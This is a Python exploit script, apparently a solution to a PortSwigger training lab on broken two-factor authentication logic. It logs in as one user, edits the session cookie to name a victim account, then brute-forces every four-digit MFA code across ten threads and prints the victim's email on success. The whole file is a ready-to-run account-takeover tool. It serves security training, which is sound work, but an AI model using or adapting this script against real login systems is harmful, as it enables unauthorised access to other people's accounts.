

from requests import request
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import signal
from sys import argv

def brute_worker(url,cookie,mfa_code):
    print('[!] Trying : '+'{:04d}'.format(mfa_code))
    
    res= request(url=url,method='POST',headers={'Cookie':cookie},data='mfa-code='+'{:04d}'.format(mfa_code))
    
    if res.content.decode().count('Incorrect security code') == 0:
        print('[+] Cracked With mfa_code : '+'{:04d}'.format(mfa_code))
        content=res.content.decode()
        emailStartIndex=content.index('Your email is:')
        print(content[emailStartIndex:-1].split("</p>")[0])
        return True
    else:
        return False

def bruteforce(url,cookie):
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_code = {}
        for mfa_code in range(0,10000):
            future = executor.submit(brute_worker,url, cookie, mfa_code)
            future_to_code[future] = mfa_code
        for future in as_completed(future_to_code):
            mfa_code = future_to_code[future]
            try:
                result = future.result()
                if result:
                    executor.shutdown(wait=False)
                    for f in future_to_code.keys():
                        if f != future:
                            f.cancel()
            except Exception as exc:
                exit()                
def pwn(url,username,password,victim_username):
    if url[-1]!='/':
        url=url+'/'
    print('[+] GET /login')
    res=request(url=url+'login',method='GET')
    cookie=res.headers.get('Set-Cookie').split(';')[0]
    
    print('[+] POST /login')
    data='username='+username+'&password='+password
    res=request(url=url+'login',method='POST',data=data,headers={'Cookie':cookie})
    
    cookie = res.history[0].headers.get('Set-Cookie').replace(username,victim_username)
    
    print('[+] GET /login2')
    res= request(url=url+'login2',method='GET',headers={'Cookie':cookie})
    bruteforce(url+'login2',cookie)


if __name__ == "__main__":
 print("""
    0xCrypt00o Solution for Portswigger LAB : 2FA broken logic
        For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==5:
     pwn(argv[1],argv[2],argv[3],argv[4])
 else:
     print("call it with : ./pwn-auth-2fa-broken-logic.py <url> <username> <password> <victim_username> ")

